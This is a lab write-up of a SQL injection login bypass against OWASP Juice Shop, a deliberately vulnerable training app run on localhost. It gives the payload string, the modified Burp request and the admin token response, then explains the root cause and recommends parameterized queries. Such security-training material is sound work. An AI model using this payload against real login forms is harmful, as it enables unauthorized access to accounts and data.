SQL Injection – Authentication Bypass

Vulnerability Summary

The application is vulnerable to SQL Injection in the login authentication mechanism. User-supplied input in the email field is not sanitized before being used in the backend SQL query.

An attacker can inject SQL statements that manipulate the query logic, allowing them to log in as any user — including the administrator — without knowing the correct password.

Target: OWASP Juice Shop  |  Tool: Burp Suite  |  Environment: Kali Linux  |  OWASP Category: A03 – Injection

Attack Scenario

The attacker injects SQL syntax into the email parameter of the login request. The injected payload breaks out of the string context and adds a condition that always evaluates to true, bypassing password verification entirely.

The Payload

SQL Injection Payload 
user2@gmail.com' OR 1=1--

How the Payload Works

PartEffect
'Closes the string literal opened by the application
OR 1=1Adds a condition that is always true — returns a valid user
--SQL comment — everything after this (including the password check) is ignored

Steps to Reproduce

Step 1 — Access the Login Page

URL
http://localhost:3000/#/login

Step 2 — Intercept the Login Request

Enable Burp Suite Proxy and submit a normal login. Capture the request:

Intercepted Request 
POST /rest/user/login HTTP/1.1
Host: localhost:3000
Content-Type: application/json

{
  "email": "user2@gmail.com",
  "password": "User2"
}

Step 3 — Send to Repeater and Inject Payload

Right-click → Send to Repeater. Replace the email value with the injection payload:

Modified Request Body 
{
  "email": "user2@gmail.com' OR 1=1--",
  "password": "User2"
}
The password field can be anything — it is completely ignored because the -- comment character removes the password check from the SQL query.

Step 4 — Send the Request

Click Send in Burp Repeater and observe the response.

Proof of Exploitation

The server returns HTTP 200 OK with a valid JWT and the admin email:

Server Response 
{
  "authentication": {
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
  },
  "bid": 4,
  "umail": "admin@juice-sh.op"
}
The authenticated user is admin@juice-sh.op — the attacker successfully logged in as the administrator without knowing the password.

Impact

  • Authentication bypass — login as any user without credentials
  • Unauthorized administrative access to the full application
  • Access to all sensitive application data
  • Ability to modify or delete data
  • In production: potential complete system compromise

Root Cause

The application constructs SQL queries using unsanitized user input directly concatenated into the query string.

Vulnerable Query

SQL — Vulnerable 
-- ❌ User input concatenated directly
SELECT * FROM Users
WHERE email = 'INPUT_EMAIL'
AND password = 'INPUT_PASSWORD';

After Injection

SQL — After Injection 
-- OR 1=1 is always true; -- comments out the password check
SELECT * FROM Users
WHERE email = 'user2@gmail.com' OR 1=1--'
AND password = 'User2';

The OR 1=1 makes the WHERE clause always true. The -- comments out the rest, removing the password condition. The database returns the first user row — which is the admin.

Mitigation

Recommended Fixes

  • Use parameterized queries — the most effective defence; user input is never interpreted as SQL
  • Use prepared statements — separate query structure from data at the driver level
  • Input validation — reject inputs containing SQL special characters (' -- ; OR)
  • ORM frameworks — use ORMs (Sequelize, SQLAlchemy) that handle escaping automatically
  • Web Application Firewall — WAF as a secondary layer to detect injection patterns
  • Least privilege DB permissions — the application DB user should only have the minimum required permissions

Secure Query Example

SQL — Parameterized Query 
-- ✅ Input is passed as a parameter, never interpreted as SQL
SELECT * FROM Users
WHERE email = ?
AND password = ?;
